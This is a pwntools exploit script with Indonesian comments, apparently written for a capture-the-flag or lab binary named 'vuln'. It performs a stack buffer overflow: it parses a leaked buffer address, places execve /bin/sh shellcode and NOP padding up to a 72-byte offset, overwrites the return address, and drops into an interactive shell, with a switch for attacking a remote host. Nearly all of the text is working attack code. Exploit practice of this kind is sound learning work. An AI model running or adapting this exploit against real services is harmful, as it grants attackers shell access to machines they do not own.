from pwn import *

# === CONFIGURATION ===
# Ganti 'local' menjadi 'remote' jika ingin menembak server asli
mode = 'local' 

if mode == 'local':
    p = process('./vuln')
else:
    # Contoh: nc 10.10.10.10 1337
    p = remote('10.10.10.10', 1337)

# 1. Definisikan Shellcode (diambil dari gambar - execve /bin/sh)
# Shellcode 23 byte x86
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'

# 2. Baca Leak Alamat Buffer
# Contoh format output: "buf is at: 0xbf92f3c0"
p.recvuntil(b'buf is at: ')
line = p.recvline()
buf_addr = int(line.strip(), 16)

log.success(f"Alamat Buffer Bocor: {hex(buf_addr)}")

# 3. Hitung Alamat Target (Shellcode di awal buffer)
shellcode_addr = buf_addr
log.info(f"Target Jump (Shellcode): {hex(shellcode_addr)}")

# 4. Susun Payload
# Offset ke Return Address adalah 72 byte (berdasarkan gambar)
offset_ret = 72
nop_count = offset_ret - len(shellcode)

payload = shellcode          # Letakkan shellcode di awal
payload += b'\x90' * nop_count # Isi sisanya dengan NOP (\x90) sampai batas ret addr
payload += p32(shellcode_addr) # Timpa Return Address dengan alamat shellcode tadi

# 5. Kirim Payload
log.info("Mengirim payload...")
p.sendline(payload)

# 6. Interaksi dengan shell yang terbuka
p.interactive()